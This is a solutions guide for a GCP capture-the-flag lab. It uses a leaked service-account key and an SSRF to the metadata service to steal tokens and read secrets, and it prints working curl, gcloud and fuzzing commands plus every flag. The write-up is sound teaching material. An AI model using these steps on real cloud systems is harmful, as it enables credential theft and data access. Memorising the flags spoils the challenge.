# GCP CTF 2025 - Solutions Guide

## Challenge Overview
This CTF demonstrates common GCP security misconfigurations and vulnerabilities, focusing on:
- Publicly accessible storage buckets
- Service account key exposure
- SSRF vulnerabilities leading to metadata service access
- Privilege escalation through GCP APIs

## Solution Walkthrough

### Step 1: Initial Discovery - Public GCS Bucket

**Challenge Entry Point:**
```
https://storage.googleapis.com/ctf-25-website-277d5f37/
```

**Discovery:**
The bucket is publicly accessible and contains the following files:
- `flag.txt` - First flag location
- `index.html` - Website content
- `medicloudx-discovery-key.json.b64` - **Critical**: Base64 encoded service account key

**Bucket Contents:**
```xml
<ListBucketResult xmlns="http://doc.s3.amazonaws.com/2006-03-01">
<Name>ctf-25-website-277d5f37</Name>
<Prefix/>
<Marker/>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>flag.txt</Key>
<Generation>1759095077700871</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2025-09-28T21:31:17.703Z</LastModified>
<ETag>"7ca4f45b7e2f8e631439750fcf28ca0d"</ETag>
<Size>42</Size>
</Contents>
<Contents>
<Key>index.html</Key>
<Generation>1759095077771340</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2025-09-28T21:31:17.773Z</LastModified>
<ETag>"4fe18fe44bc2c2e694017b9b8b86fb91"</ETag>
<Size>14570</Size>
</Contents>
<Contents>
<Key>medicloudx-discovery-key.json.b64</Key>
<Generation>1759095077754749</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2025-09-28T21:31:17.757Z</LastModified>
<ETag>"edb91d38291e5689364fbb0b94a7e042"</ETag>
<Size>3201</Size>
</Contents>
</ListBucketResult>
```

### Step 2: Service Account Key Extraction

**Download and decode the service account key:**
```bash
curl -s https://storage.googleapis.com/ctf-25-website-277d5f37/medicloudx-discovery-key.json.b64 \
  | base64 -D -o medicloudx-discovery-key.json
```

**Service Account Details:**
```json
{
  "type": "service_account",
  "project_id": "arctic-bee-470901-c4",
  "private_key_id": "c29b60a0d32198a7ce7972d004ce134b30cdcf41",
  "private_key": "-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----\n",
  "client_email": "medicloudx-discovery-sa@arctic-bee-470901-c4.iam.gserviceaccount.com",
  "client_id": "108668394632705516430",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/medicloudx-discovery-sa%40arctic-bee-470901-c4.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
```

### Step 3: GCP Authentication & Resource Enumeration

**Authenticate with the compromised service account:**
```bash
export GOOGLE_APPLICATION_CREDENTIALS="$(pwd)/medicloudx-discovery-key.json"
gcloud auth activate-service-account --key-file="$GOOGLE_APPLICATION_CREDENTIALS"
PROJECT_ID="$(jq -r '.project_id' medicloudx-discovery-key.json)"
gcloud config set project "$PROJECT_ID"
```

**Enumerate GCP Resources:**

**1. Secret Manager:**
```bash
export PROJECT="arctic-bee-470901-c4"
TOKEN="$(gcloud auth print-access-token)"
curl -s -H "Authorization: Bearer ${TOKEN}" \
  "https://secretmanager.googleapis.com/v1/projects/${PROJECT}/secrets?pageSize=100" \
  | jq -r '.secrets[]?.name'
```
**Result:** `projects/821367905686/secrets/medicloudx-store-secret-090716d7`

**2. Firestore Databases:**
```bash
curl -s -H "Authorization: Bearer ${TOKEN}" \
  "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases" \
  | jq -r '.databases[].name'
```
**Result:** `projects/arctic-bee-470901-c4/databases/medicloudx-store`

**3. Cloud Storage Buckets:**
```bash
curl -s -H "Authorization: Bearer ${TOKEN}" \
  "https://storage.googleapis.com/storage/v1/b?project=${PROJECT}&projection=noAcl" \
  | jq '.items[].name'
```
**Results:**
- `"ctf-25-terraform-state-gcp"`
- `"ctf-25-website-277d5f37"`
- `"medicloudx-store-bucket-a8706878"`

**4. Firestore Collections:**
```bash
DB_ID="medicloudx-store"
curl -s -X POST \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/${DB_ID}/documents:listCollectionIds" \
  -d '{"pageSize":1000}' | jq -r '.collectionIds[]'
```
**Result:** `medicloudx-store-audit-logs`

### Step 4: SSRF Exploitation - Metadata Service Access

**Discovering the Vulnerable Service:**
Para encontrar el servicio vulnerable a SSRF, es necesario realizar un ataque de descubrimiento de directorios o fuzzing en el servidor objetivo. Utilizando herramientas como `dirb`, `gobuster`, `ffuf` o `wfuzz`, podrás descubrir el endpoint crítico:

```bash
# Ejemplo usando gobuster
gobuster dir -u http://107.178.220.73/ -w /usr/share/wordlists/dirb/common.txt -x json

# Ejemplo usando ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://107.178.220.73/FUZZ -e .json,.txt,.html

# Ejemplo usando dirb
dirb http://107.178.220.73/ /usr/share/wordlists/dirb/common.txt -X .json
```

**Endpoint Crítico Descubierto:**
```
http://107.178.220.73/swagger.json
```

Este endpoint revela la documentación de la API y expone rutas críticas, incluyendo el endpoint `/admin/fetch` que es vulnerable a SSRF.

**The Critical Vulnerability:**
The application has an SSRF vulnerability in the admin service that allows accessing the GCP metadata service. The key is using the `Metadata-Flavor: Google` header which gets forwarded properly.

**Exploit the SSRF to get instance credentials:**
```bash
RAW=$(curl -X POST http://107.178.220.73/admin/fetch \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Metadata-Flavor: Google" \
  -d "url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token")

TOKEN=$(printf '%s' "$RAW" | sed -n '/^{/,$p' | jq -r '.access_token')
```

### Step 5: Flag Extraction

With the compromised instance token, we can access the protected resources:

**Flag 1 - Cloud Storage:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/medicloudx-store-bucket-a8706878/o" | jq .

# Download the flag
BUCKET="medicloudx-store-bucket-a8706878"
OBJECT="flag.txt"
curl -s -H "Authorization: Bearer ${TOKEN}" \
  "https://storage.googleapis.com/download/storage/v1/b/${BUCKET}/o/${OBJECT}?alt=media" \
  -o "${OBJECT}"

cat flag.txt
```
**Flag 1:** `CLD[8634a8bb-7b6b-7a3d-ce55-8019cafc7fd1]`

**Flag 2 - Secret Manager:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/821367905686/secrets/medicloudx-store-secret-090716d7/versions/latest:access"
```
**Response includes base64 encoded data:** `Q0xEW2ZkYTBiNDAwLWRiNzgtNGRmOC1lNGEzLTMyNDRjNzRhZmY0MV0=`
**Flag 2:** `CLD[fda0b400-db78-4df8-e4a3-3244c74aff41]` (after base64 decode)

**Flag 3 - Firestore:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://firestore.googleapis.com/v1/projects/arctic-bee-470901-c4/databases/medicloudx-store/documents/medicloudx-store-audit-logs?pageSize=100" | jq .
```
**Flag 3:** `CLD[82d32aa6-abb7-4f2f-cee4-4b3804506d50]` (found in the secret field)

## Summary of Flags

1. **Storage Flag:** `CLD[8634a8bb-7b6b-7a3d-ce55-8019cafc7fd1]`
2. **Secret Manager Flag:** `CLD[fda0b400-db78-4df8-e4a3-3244c74aff41]`
3. **Firestore Flag:** `CLD[82d32aa6-abb7-4f2f-cee4-4b3804506d50]`

## Key Vulnerabilities Exploited

1. **Publicly Accessible Storage Bucket** - Exposed sensitive service account credentials
2. **Overprivileged Service Account** - Had unnecessary permissions for resource enumeration
3. **SSRF in Admin Service** - Allowed access to GCP metadata service
4. **Improper Header Handling** - Application forwarded `Metadata-Flavor` header enabling metadata access
5. **Excessive Instance Permissions** - Compute instance had access to multiple GCP services

## Security Lessons

- Never store service account keys in public locations
- Apply principle of least privilege to service accounts
- Implement proper input validation for admin functions
- Restrict metadata service access from applications
- Use workload identity instead of service account keys
- Implement proper access controls on GCP resources
